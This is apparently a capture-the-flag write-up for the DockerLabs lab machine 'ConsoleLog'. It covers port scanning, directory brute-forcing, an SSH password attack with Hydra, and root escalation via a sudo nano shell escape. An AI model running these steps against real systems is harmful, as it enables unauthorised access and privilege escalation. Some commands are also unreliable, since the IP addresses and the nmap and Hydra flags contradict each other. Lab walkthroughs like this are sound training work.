Hello!

In this write-up, we will dive into the **DockerLabs** machine [ConsoleLog](https://mega.nz/file/oGMWiKoJ#l02GwzicvsgLaczCjTSqaJNl5-NGajklpOY3A3Tu9to).

Let's go!

## Active recognition
---

As a first step, we will execute the `ping` command to verify that the target machine is active:

```bash
ping -c 1 172.17.0.2
```


## Port scanning
---

Next, we run a scan with `nmap` to identify open ports on the target machine.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv 172.18.0.2 -oG allPorts
```

The only open ports that we see are 80 (HTTP server), 3000 (API) and 5000 (SSH), we can see more information of the services by executing:

```bash
nmap -sCV 22,80 172.18.0.2 -oN targeted -oX targetedXML
```

## Exploitation
---
We see a button and the machine's name give us a clue, let's try to click the button and see what's the output of the console (there is a `console.log`)

We see a message: "Para opciones de depuraci√≥n, el token de /recurso/ es tokentraviesito"

We can't see much more information so let's try to find hidden directories:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r
```

We find the endpoint `/backend`. If we open it, we can see the following website:

![backend](endpoint_backend.png)

We can see a file named `server.js` let's see what it contains:

![server-js](server-js.png)

We have found a password, let's try to use Hydra to get into the SSH server:

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xat-net-10-million-usernames.txt -P lapa++++++todas ssh://172.17.0.2:5000 -s 22 -t 64
```

We can see now that the user is lovely, and we can access via SSH with his credentials:

```bash
ssh lovely@172.17.0.2 -p 5000
```

<br>

## Privilege escalation
---

First, we should export the xterm to easily work with the SSH terminal. We can do this just by executing the following:
```bash
export TERM=xterm
```

Now, as the user Lovely, we are able to run the command `sudo -l` to try to find superuser processes that we can run as the user prod:

![sudo-l](sudo-l.png)

We find that we can execute the `nano` tool as sudo.

We can access `nano` and obtain a shell by executing the following:

```bash
sudo nano
```

Once we are inside nano, we are going to type `CTRL+R` and then `CTRL+X`, we can now see that we can execute commands.

At this point, we are going to execute:

```bash
reset; sh 1>&0 2>&0
```

And now, we have access to a root priveleged terminal.

![root-sh](root-sh.png)

We can execute the following to get a full functional shell:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![sudo_access](privilege2.png)

Now we have gained superuser access and we have the whole system committed.
